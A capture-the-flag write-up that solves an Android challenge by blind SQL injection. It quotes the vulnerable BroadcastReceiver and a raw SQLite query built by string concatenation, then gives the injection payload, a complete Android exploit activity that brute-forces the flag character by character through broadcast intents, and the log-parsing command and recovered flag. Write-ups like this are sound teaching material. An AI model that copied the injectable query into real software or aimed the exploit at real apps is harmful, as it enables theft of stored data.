# Little Bobby Application (250 pts)

We are given an APK file with the following instruction:

> Find the vulnerability, develop an exploit, and when you're ready, submit your APK to https://bottle-brush-tree.ctfcompetition.com. Can take up to 15 minutes to return the result.

This is a very simple blind SQL Injection, the app receives login request via LoginReceiver (a BroadcastReceiver).

```java
public class LoginReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        String username = intent.getStringExtra(UserEntry.COLUMN_NAME_USERNAME);
        String password = intent.getStringExtra(UserEntry.COLUMN_NAME_PASSWORD);
        Log.d("Received", username + ":" + password);
        String msg = new LocalDatabaseHelper(context).checkLogin(username, password);
        Intent outputIntent = new Intent();
        outputIntent.setAction("com.bobbytables.ctf.myapplication_OUTPUTINTENT");
        outputIntent.putExtra(NotificationCompatApi21.CATEGORY_MESSAGE, msg);
        context.sendBroadcast(outputIntent);
    }
}
```

Which in turn calls this method in `LocalDatabaseHelper`:

```java
 public String checkLogin(String username, String password) {
        SQLiteDatabase db = getReadableDatabase();
        Cursor c = db.rawQuery("select password,salt from users where username = \"" + username + "\"", null);
        Log.d("Username", username);
        if (c == null || c.getCount() <= 0) {
            if (c != null) {
                c.close();
            }
            db.close();
            Log.d("Result", "User does not exist");
            return "User does not exist";
        }
        c.moveToFirst();
        String testPassword = c.getString(0);
        String testSalt = c.getString(DATABASE_VERSION);
        c.close();
        db.close();
        if (Utils.calcHash(password + testSalt).equals(testPassword)) {
            Log.d("Result", "Logged in");
            return "Logged in";
        }
        Log.d("Result", "Incorrect password");
        return "Incorrect password";
    }
```

The flag is created with following format:

```
   public long insert(String username, String password) {
        int salt = new Random().nextInt(31337);
        String password_hash = Utils.calcHash(password + new Integer(salt).toString());
        SQLiteDatabase db = getWritableDatabase();
        ContentValues values = new ContentValues();
        values.put(UserEntry.COLUMN_NAME_USERNAME, username);
        values.put(UserEntry.COLUMN_NAME_PASSWORD, password_hash);
        values.put(UserEntry.COLUMN_NAME_FLAG, "ctf{An injection is all you need to get this flag - " + password_hash + "}");
        values.put(UserEntry.COLUMN_NAME_SALT, new Integer(salt).toString());
        long rowId = db.insert(UserEntry.TABLE_NAME, null, values);
        db.close();
        return rowId;
    }
```

So this is a blind injection, we can use something like `" or substr(flag, 53, 1)="a` to check if first hash is `a` (and repeat it as necassary), we will either get `User does not exist` or `Incorrect password` in the log.

And here is the exploit. I am not an Android developer, and wasn't sure do I have to start the app first or not? (just to be sure, I started it first), and do I need to wait? (not sure, so I just wait).

```java
package com.example.yohanes.myapplication;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent mainIntent = new Intent();
        Log.d("JOJOJO", "sending JOJOJOJO");
        //make sure bobby app is running
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage("bobbytables.ctf.myapplication");
        startActivity(launchIntent);

        Log.d("SLEEP", "SLEEP");
        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {

        }
        Log.d("SLEEP", "DONE SLEEP");

        String hexchar = "0123456789abcdef";
        for (int i =0; i < 32; i++) {
            for (int j =0; j < 16; j++) {
                mainIntent.setAction("com.bobbytables.ctf.myapplication_INTENT");
                String s = String.format("\" or substr(flag, %d, 1)=\"%c", 53 + i, hexchar.charAt(j));
                mainIntent.putExtra("username", s);
                mainIntent.putExtra("password", "testpass");
                getApplicationContext().sendBroadcast(mainIntent);
            }
        }
    }
}
```


It took a long time until the log came back. From the log file we can do this:

```
$ cat bobby-flag.txt |egrep "Incorrect password" -B 1|grep substr| sort -u| cut -f 3 -d';'| cut -c 1|xargs echo|sed -e 's/ //g'
106b826d7d5ec465b0c5d385a41c6ff6
```

So the flag is:

```
ctf{An injection is all you need to get this flag - 106b826d7d5ec465b0c5d385a41c6ff6}
```
